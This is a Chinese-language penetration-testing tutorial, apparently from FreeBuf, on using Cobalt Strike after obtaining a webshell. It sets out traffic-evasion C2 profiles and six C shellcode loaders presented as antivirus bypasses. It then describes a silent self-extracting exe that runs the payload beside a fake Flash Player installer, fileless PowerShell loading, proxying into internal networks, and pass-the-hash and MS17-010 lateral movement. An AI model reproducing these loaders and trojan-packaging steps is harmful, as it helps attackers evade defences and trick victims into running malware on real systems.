@@ -1,0 +1,325 @@
+##  前言
+
+**去年年初发了一篇文章[Web渗透实验：基于Weblogic的一系列漏洞](https://www.freebuf.com/vuls/194811.html)，**
+**今年把这篇文章接力写一下。**
+
+通常来讲，拿到webshell我们一般可以这么利用（百度搜索：内网渗透之reGeorg+Proxifier）。
+
+这篇文章用cs开启代理，用proxifier连接后潜入内网。
+
+这里引用一张实验室小伙伴总结的内网常见工具图。
+
+![](https://image.3001.net/images/20200106/1578309439_5e13173ff3a48.jpg!small)  
+有兴趣同学可以看看该文章[《内网渗透之端口转发》](https://mp.weixin.qq.com/s?__biz=MzAxNjQ1NDQ0Mw==&mid=2247483939&idx=1&sn=4aced29075f2c3d3d43264c01f08169a&chksm=9bf5c467ac824d71e7831fdd02b8ae61413c09fdbb5f836bbd016a7c0fd031bc91ac274b8ca2&token=1380986489&lang=zh_CN#rd)。
+
+##  第一步：cobaltstrike服务端客户端
+
+###  一、服务端
+
+1.流量检测绕过
+
+定义C2的通信格式，修改CS默认的流量特征，以对抗流量分析
+
+> 开源Profiles： <https://github.com/rsmudge/Malleable-C2-Profiles>
+
+2.测试运行Profiles是否正常
+
+    
+    
+    ./c2lint
+
+没有出现红色的提示则为正常
+
+![](https://image.3001.net/images/20200107/1578370996_5e1407b405b84.png!small)3.后台运行
+
+一般都是用服务器，所以关闭终端就是断开与服务器的连接，且当前运行的进程会结束，所以我们需要后台运行
+
+但是当我使用nohup启动时，还是发现会间歇的终断我的服务端。
+
+这里使用screen工具
+
+安装：
+
+CentOS/RedHat/Fedora
+
+    
+    
+    yum -y install screen
+
+Ubuntu/Debian
+
+    
+    
+    apt-get -y install screen
+
+常用命令：
+
+创建会话（-m 强制）：
+
+    
+    
+    screen -dmS name
+
+查看所有会话：
+
+    
+    
+    screen -ls
+
+进入会话：
+
+    
+    
+    screen -r name
+
+远程deatch某个会话（暂时离开某session）
+
+    
+    
+    screen -d （screen -d yourname ）
+
+退出当前的会话保持程序运行
+
+    
+    
+    ctrl+a+d
+
+服务端启动命令：
+
+sodu ./teamserver 服务器IP 连接密码 Profiles文件（Profiles是为了绕过ids，可以不写）
+
+![](https://image.3001.net/images/20200107/1578371804_5e140adc2904b.png!small)
+
+###  二、客户端
+
+1.打开cs
+
+    
+    
+     java -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC  -jar cobaltstrike.jar
+
+这里用的是3.14patch中文版（文末见下载地址）
+
+2.AggressorScripts（侵略者脚本）
+
+脚本介绍：（不增加篇幅了，引用2篇文章）
+
+> [使用Aggressor脚本雕饰Cobalt
+> Strike](https://mp.weixin.qq.com/s/CEI1XYkq2PZmYsP0DRU7jg)
+>
+> [Cobalt
+> Strike系列教程第六章：安装扩展](https://mp.weixin.qq.com/s?__biz=MzUzNTkyODI0OA==&mid=2247494689&idx=1&sn=ac02cef2e7ab26c3528486be826f7554&chksm=fafca0f6cd8b29e0ebe7d1869135919b240c6572db380126b7f4fed56b0915101a8a6791ca3a&scene=21#wechat_redirect)
+
+笔者常用：
+
+> AVQuery.nsa （通过检查注册表键值来判断杀毒软件）
+>
+> ProcessColor.cna（显示带有颜色的进程列表）
+>
+> ProcessMonitor.cna（指定时间段内对于程序运行情况的监控）
+>
+> elevate.cna（增加五种提权方式）
+
+3.shellcode免杀及捆绑exe
+
+(1)生成shellcode
+
+(2)c加载（网络收集的加载方法）
+
+    
+    
+    #include <windows.h>
+    #include <stdio.h>
+    #pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
+    unsigned char shellcode[] =
+    "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b"
+    "\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0"
+    "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57";
+    void main()
+    {
+     ((void(*)(void))&shellcode)();
+    }
+    
+    
+    #include <windows.h>
+    #include <stdio.h>
+    #pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
+    unsigned char shellcode[] =
+    "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b"
+    "\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0"
+    "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57";
+    void main()
+    {
+         PVOID p = NULL;
+                   if((p = VirtualAlloc(NULL,sizeof(shellcode),MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE)) == NULL)
+                                   MessageBox(NULL,"VirtuallAlloc Failed!!!","Prompt",MB_OK);
+                   if(!(memcpy(p,shellcode,sizeof(shellcode))))
+                                   MessageBox(NULL,"WriteMemory Failed!!!","Prompt",MB_OK);
+                   CODE code = (CODE)p;  
+                   code();  
+    }
+    
+    
+    #include <windows.h>
+    #include <stdio.h>
+    #pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
+    unsigned char shellcode[] =
+    "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b"
+    "\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0"
+    "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57";
+    void main()
+    {
+                   __asm
+                   {  
+                                   lea eax,shellcode;  
+                                   jmp eax;  
+                   }  
+    }
+    
+    
+    #include <windows.h>
+    #include <stdio.h>
+    #pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
+    unsigned char shellcode[] =
+    "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b"
+    "\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0"
+    "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57";
+    void main()
+    {
+       __asm  
+                   {  
+                                   mov eax,offset shellcode;  
+                                   jmp eax;
+                   }  
+    }
+    
+    
+    #include <windows.h>
+    #include <stdio.h>
+    #pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
+    unsigned char shellcode[] =
+    "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b"
+    "\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0"
+    "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57";
+    void main()
+    {
+                    __asm
+                   {
+                                   mov eax,offset shellcode;
+                                   _emit 0xFF;
+                                   _emit 0xE0;
+                   } 
+    }
+    
+    
+    #include <windows.h>
+    #include <stdio.h>
+    unsigned char shellcode[] =
+    "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b"
+    "\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0"
+    "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57";
+    unsigned char noshellcode[] = "";
+    void main()
+    {
+      ((void(*)(void))&noshellcode)();
+    }
+
+**用python go等语言打包成exe免杀效果更佳。**
+
+(3)自解压
+
+1、coblatstrike 生成的shellcode经过处理生成的exe，然后准备一个exe的程序。
+
+2、鼠标右键，添加到压缩文件。点击创建自解压格式压缩文件。rar就会变成exe后缀的文件。
+
+![](https://image.3001.net/images/20200107/15783868414378.png!small)
+
+3、高级自解压选项，
+
+常规->解压路径
+
+> C:\windows\temp  
+>
+
+绝对路径
+
+4、设置
+
+设置程序
+
+提取后运行
+
+> C:\windows\temp\shellcode.exe
+>
+> C:\windows\temp\flashplayer_install_cn.exe
+
+5、模式
+
+> 静默模式->全部隐藏
+
+6、更新
+
+更新方式
+
+解压并更新文件，覆盖所有文件
+
+7、点击确定按钮，在点击确定按钮生成"新建文件夹.exe"
+
+##  第二步：shell提权利用
+
+不是管理员权限可以在webshell管理器提权，cs也支持提权，用到我们的AggressorScripts，提权cna脚本。
+
+![](https://image.3001.net/images/20200106/1578310290_5e131a9237102.jpg!small)
+（提权前）  
+![](https://image.3001.net/images/20200106/1578310295_5e131a970dfc4.jpg!small)（提权后）
+
+##  第三步：横向内网
+
+这里提一下无文件渗透：
+
+在windows下，一般通过远程加载powershell脚本来进行。
+
+![](https://image.3001.net/images/20200107/1578372535_5e140db754369.png!small)
+
+cs直接生成这条命令。
+
+![](https://image.3001.net/images/20200107/1578372584_5e140de81d03b.png!small)复制这条命令去执行目标上线且没有留下任何文件（这就叫无文件渗透）
+
+这里简单介绍，有兴趣的去深入了解一下powershell。
+
+1.开启代理
+
+![](https://image.3001.net/images/20200106/1578310387_5e131af3d589c.jpg!small)
+
+2.下载proxychains4并配置
+
+修改配置vim zhukaiang7/usr/local/etc/proxychains.conf
+
+测试是否成功：
+
+proxychains4 curl ip.cn
+
+![](https://image.3001.net/images/20200106/1578310432_5e131b20919ca.png!small)
+
+（代理失败）![](https://image.3001.net/images/20200106/1578310437_5e131b2520fbc.png!small)（代理成功）
+
+3.下载proxifier及配置
+
+![](https://image.3001.net/images/20200106/1578310504_5e131b682bff8.png!small)附录：
+
+内网渗透主要还是信息收集，很多时候内网密码同样的 直接通杀。
+
+>
+> 1.抓取现有肉鸡服务器的密码，走一波内网通用口令及弱口令，可以对B段或C段进行扫描,ms17010漏洞的扫描利用，中间件漏洞，如weblogic、jboss、等漏洞。
+>
+> 2.寻找到域成员主机，定位域控服务器IP，如果有域管理员或域成员hash，可以pass the hash尝试登录其他主机，直到得到域管理员账号hash。
+
+附上视频学习：  
+
+***本文原创作者： zhukaiang7，本文属于FreeBuf原创奖励计划，未经许可禁止转载**  
+  
+  
+  
+  
+  
+
